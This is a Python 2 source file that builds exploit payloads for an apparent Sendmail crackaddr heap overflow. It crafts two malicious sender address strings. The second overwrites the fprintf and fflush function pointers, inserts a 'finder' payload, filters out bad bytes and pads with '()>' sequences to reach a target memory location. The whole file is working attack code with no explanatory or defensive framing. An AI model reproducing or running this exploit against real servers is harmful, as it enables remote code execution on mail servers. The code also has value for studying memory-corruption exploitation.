import finder
import utils

class senders:
   def __init__(self, badBytes):
      self.badBytes = badBytes

   def buildSender1(self, len):
      body = ""
      for i in range(len / 4):
         body += utils.u32ToLeU32String(self.crackaddrBufLocation)
      if (utils.bufHasBadBytes(body, self.badBytes)):
         print "sender1 has bad bytes"
         return None
      return body

   def buildSender2(self, finderValue):
      finder.data = finderValue

      filler = utils.buildBuffer(0xf9, self.badBytes)
      sender2 = "(" + filler[0x1:0x4]
      for i in range(0x4, 0x34, 4):
         sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation)
      sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x4c)
      for i in range(0x38, 0x44, 4):
         sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation)
      sender2 += filler[0x44:0x46]
      sender2 += chr(0xa0)
      sender2 += filler[0x47:0x68]
      # 0x68 - 0x6c -- overwrite (v)fprintf ptr (crackaddrBufLoc + 0x4c + 0x1c)
      sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x80)
      sender2 += filler[0x6c:0x7c]
      # 0x7c - 0x80 -- overwrite fflush ptr (crackaddrBufLoc + 0x4c + 0x30)
      sender2 += utils.u32ToLeU32String(self.crackaddrBufLocation + 0x80)
      # 0x80 - ?
      sender2 += finder.build()
      sender2 += filler[len(sender2):]
      sender2 += ")"

      if (utils.bufHasBadBytes(sender2[1:-1], self.badBytes)):
         print "sender2 has bad bytes"
         return None

      nparens = (self.mciCacheLocation - self.crackaddrBufLocation) \
                - len(sender2)
      for i in range(nparens):
         sender2 += "()>"

      return sender2
